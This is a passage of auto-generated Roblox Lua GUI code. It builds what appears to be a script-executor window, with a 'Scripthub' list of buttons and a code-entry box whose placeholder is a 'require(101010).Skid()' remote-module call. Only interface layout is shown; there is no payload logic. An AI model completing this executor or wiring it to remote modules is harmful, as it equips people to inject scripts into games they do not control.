G2L["51"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["52"] = Instance.new("TextButton", G2L["2b"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["TextSize"] = 14;
G2L["52"]["TextScaled"] = true;
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["52"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["Position"] = UDim2.new(0.076, 0, 0.365, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["53"] = Instance.new("UICorner", G2L["52"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["54"] = Instance.new("UIStroke", G2L["52"]);
G2L["54"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["54"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["52"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["56"] = Instance.new("TextButton", G2L["2b"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextSize"] = 14;
G2L["56"]["TextScaled"] = true;
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["56"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Position"] = UDim2.new(0.076, 0, 0.405, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["57"] = Instance.new("UICorner", G2L["56"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["58"] = Instance.new("UIStroke", G2L["56"]);
G2L["58"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["58"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["59"] = Instance.new("LocalScript", G2L["56"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["5a"] = Instance.new("TextButton", G2L["2b"]);
G2L["5a"]["TextWrapped"] = true;
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["TextSize"] = 14;
G2L["5a"]["TextScaled"] = true;
G2L["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5a"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["Position"] = UDim2.new(0.076, 0, 0.445, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["5b"] = Instance.new("UICorner", G2L["5a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["5c"] = Instance.new("UIStroke", G2L["5a"]);
G2L["5c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["5d"] = Instance.new("LocalScript", G2L["5a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["5e"] = Instance.new("TextButton", G2L["2b"]);
G2L["5e"]["TextWrapped"] = true;
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["TextSize"] = 14;
G2L["5e"]["TextScaled"] = true;
G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Position"] = UDim2.new(0.076, 0, 0.485, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["5f"] = Instance.new("UICorner", G2L["5e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["60"] = Instance.new("UIStroke", G2L["5e"]);
G2L["60"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["60"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["61"] = Instance.new("LocalScript", G2L["5e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["62"] = Instance.new("TextButton", G2L["2b"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextSize"] = 14;
G2L["62"]["TextScaled"] = true;
G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Position"] = UDim2.new(0.076, 0, 0.525, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["63"] = Instance.new("UICorner", G2L["62"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["64"] = Instance.new("UIStroke", G2L["62"]);
G2L["64"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["64"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["65"] = Instance.new("LocalScript", G2L["62"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["66"] = Instance.new("TextButton", G2L["2b"]);
G2L["66"]["TextWrapped"] = true;
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["TextSize"] = 14;
G2L["66"]["TextScaled"] = true;
G2L["66"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["66"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Position"] = UDim2.new(0.076, 0, 0.565, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["67"] = Instance.new("UICorner", G2L["66"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["68"] = Instance.new("UIStroke", G2L["66"]);
G2L["68"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["68"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["69"] = Instance.new("LocalScript", G2L["66"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["6a"] = Instance.new("TextButton", G2L["2b"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextScaled"] = true;
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Position"] = UDim2.new(0.076, 0, 0.605, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["6b"] = Instance.new("UICorner", G2L["6a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["6c"] = Instance.new("UIStroke", G2L["6a"]);
G2L["6c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["6d"] = Instance.new("LocalScript", G2L["6a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["6e"] = Instance.new("TextButton", G2L["2b"]);
G2L["6e"]["TextWrapped"] = true;
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["TextSize"] = 14;
G2L["6e"]["TextScaled"] = true;
G2L["6e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6e"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["Position"] = UDim2.new(0.076, 0, 0.645, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["6f"] = Instance.new("UICorner", G2L["6e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["70"] = Instance.new("UIStroke", G2L["6e"]);
G2L["70"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["70"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["71"] = Instance.new("LocalScript", G2L["6e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["72"] = Instance.new("TextButton", G2L["2b"]);
G2L["72"]["TextWrapped"] = true;
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextSize"] = 14;
G2L["72"]["TextScaled"] = true;
G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Position"] = UDim2.new(0.076, 0, 0.685, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["73"] = Instance.new("UICorner", G2L["72"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["74"] = Instance.new("UIStroke", G2L["72"]);
G2L["74"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["74"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["75"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["76"] = Instance.new("TextButton", G2L["2b"]);
G2L["76"]["TextWrapped"] = true;
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextScaled"] = true;
G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["Position"] = UDim2.new(0.076, 0, 0.725, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["77"] = Instance.new("UICorner", G2L["76"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["78"] = Instance.new("UIStroke", G2L["76"]);
G2L["78"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["78"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["79"] = Instance.new("LocalScript", G2L["76"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["7a"] = Instance.new("TextButton", G2L["2b"]);
G2L["7a"]["TextWrapped"] = true;
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextScaled"] = true;
G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7a"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Position"] = UDim2.new(0.076, 0, 0.765, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["7b"] = Instance.new("UICorner", G2L["7a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["7c"] = Instance.new("UIStroke", G2L["7a"]);
G2L["7c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["7e"] = Instance.new("TextButton", G2L["2b"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["TextScaled"] = true;
G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7e"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Position"] = UDim2.new(0.076, 0, 0.805, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["7f"] = Instance.new("UICorner", G2L["7e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["80"] = Instance.new("UIStroke", G2L["7e"]);
G2L["80"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["80"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["81"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["82"] = Instance.new("TextButton", G2L["2b"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextScaled"] = true;
G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Position"] = UDim2.new(0.076, 0, 0.845, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["83"] = Instance.new("UICorner", G2L["82"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["84"] = Instance.new("UIStroke", G2L["82"]);
G2L["84"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["84"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["82"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["86"] = Instance.new("TextButton", G2L["2b"]);
G2L["86"]["TextWrapped"] = true;
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["TextSize"] = 14;
G2L["86"]["TextScaled"] = true;
G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Position"] = UDim2.new(0.076, 0, 0.885, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["87"] = Instance.new("UICorner", G2L["86"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["88"] = Instance.new("UIStroke", G2L["86"]);
G2L["88"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["88"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["89"] = Instance.new("LocalScript", G2L["86"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["8a"] = Instance.new("TextButton", G2L["2b"]);
G2L["8a"]["TextWrapped"] = true;
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["TextSize"] = 14;
G2L["8a"]["TextScaled"] = true;
G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Position"] = UDim2.new(0.076, 0, 0.925, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["8b"] = Instance.new("UICorner", G2L["8a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["8c"] = Instance.new("UIStroke", G2L["8a"]);
G2L["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["8d"] = Instance.new("LocalScript", G2L["8a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["8e"] = Instance.new("TextButton", G2L["2b"]);
G2L["8e"]["TextWrapped"] = true;
G2L["8e"]["BorderSizePixel"] = 0;
G2L["8e"]["TextSize"] = 14;
G2L["8e"]["TextScaled"] = true;
G2L["8e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8e"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8e"]["Position"] = UDim2.new(0.076, 0, 0.965, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["8f"] = Instance.new("UICorner", G2L["8e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["90"] = Instance.new("UIStroke", G2L["8e"]);
G2L["90"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["90"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["91"] = Instance.new("LocalScript", G2L["8e"]);



-- StarterGui.ScreenGui.Exec.Scroll
G2L["92"] = Instance.new("ScrollingFrame", G2L["c"]);
G2L["92"]["BorderSizePixel"] = 0;
G2L["92"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["92"]["Name"] = [[Scroll]];
G2L["92"]["Size"] = UDim2.new(0.80562, 0, 0.71224, 0);
G2L["92"]["ScrollBarImageColor3"] = Color3.fromRGB(64, 182, 255);
G2L["92"]["Position"] = UDim2.new(0.02993, 0, 0.1422, 0);
G2L["92"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["92"]["ScrollBarThickness"] = 6;
G2L["92"]["BackgroundTransparency"] = 0.5;


-- StarterGui.ScreenGui.Exec.Scroll.Code
G2L["93"] = Instance.new("TextBox", G2L["92"]);
G2L["93"]["CursorPosition"] = -1;
G2L["93"]["Name"] = [[Code]];
G2L["93"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["TextSize"] = 14;
G2L["93"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["93"]["Selectable"] = false;
G2L["93"]["MultiLine"] = true;
G2L["93"]["AnchorPoint"] = Vector2.new(1, 0);
G2L["93"]["ClearTextOnFocus"] = false;
G2L["93"]["PlaceholderText"] = [[require(101010).Skid()]];
G2L["93"]["Size"] = UDim2.new(0.93537, 0, 1, 0);
G2L["93"]["Position"] = UDim2.new(0.9791, 0, 0, 0);
G2L["93"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["93"]["Text"] = [[]];
G2L["93"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Exec.Scroll.Code.Globals_
G2L["94"] = Instance.new("TextLabel", G2L["93"]);
G2L["94"]["ZIndex"] = 2;
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["TextSize"] = 14;
G2L["94"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["94"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["94"]["TextColor3"] = Color3.fromRGB(87, 157, 215);
G2L["94"]["BackgroundTransparency"] = 1;
G2L["94"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["94"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["94"]["Text"] = [[]];
G2L["94"]["Name"] = [[Globals_]];


-- StarterGui.ScreenGui.Exec.Scroll.Code.Keywords_
G2L["95"] = Instance.new("TextLabel", G2L["93"]);
G2L["95"]["ZIndex"] = 2;
G2L["95"]["BorderSizePixel"] = 0;
G2L["95"]["TextSize"] = 14;
G2L["95"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["95"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["95"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["95"]["TextColor3"] = Color3.fromRGB(87, 157, 215);
G2L["95"]["BackgroundTransparency"] = 1;
G2L["95"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["95"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["95"]["Text"] = [[]];
G2L["95"]["Name"] = [[Keywords_]];


-- StarterGui.ScreenGui.Exec.Scroll.Code.RemoteHighlight_
G2L["96"] = Instance.new("TextLabel", G2L["93"]);
G2L["96"]["ZIndex"] = 2;
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["TextSize"] = 14;
G2L["96"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["96"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["TextColor3"] = Color3.fromRGB(113, 255, 228);
G2L["96"]["BackgroundTransparency"] = 1;
G2L["96"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["96"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["96"]["Text"] = [[]];
G2L["96"]["Name"] = [[RemoteHighlight_]];


-- StarterGui.ScreenGui.Exec.Scroll.Code.Strings_
G2L["97"] = Instance.new("TextLabel", G2L["93"]);
G2L["97"]["ZIndex"] = 2;
G2L["97"]["BorderSizePixel"] = 0;
G2L["97"]["TextSize"] = 14;
G2L["97"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["97"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["97"]["TextColor3"] = Color3.fromRGB(215, 158, 134);
G2L["97"]["BackgroundTransparency"] = 1;
G2L["97"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["97"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["97"]["Text"] = [[]];
G2L["97"]["Name"] = [[Strings_]];


-- StarterGui.ScreenGui.Exec.Scroll.Code.Numbers_
G2L["98"] = Instance.new("TextLabel", G2L["93"]);
G2L["98"]["ZIndex"] = 2;
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["TextSize"] = 14;
G2L["98"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["98"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["98"]["TextColor3"] = Color3.fromRGB(182, 207, 169);
G2L["98"]["BackgroundTransparency"] = 1;
G2L["98"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["98"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["98"]["Text"] = [[]];
G2L["98"]["Name"] = [[Numbers_]];


-- StarterGui.ScreenGui.Exec.Scroll.Code.Comments_
G2L["99"] = Instance.new("TextLabel", G2L["93"]);
G2L["99"]["ZIndex"] = 2;
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["TextSize"] = 14;
G2L["99"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["99"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["99"]["TextColor3"] = Color3.fromRGB(88, 167, 75);
G2L["99"]["BackgroundTransparency"] = 1;
G2L["99"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["99"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
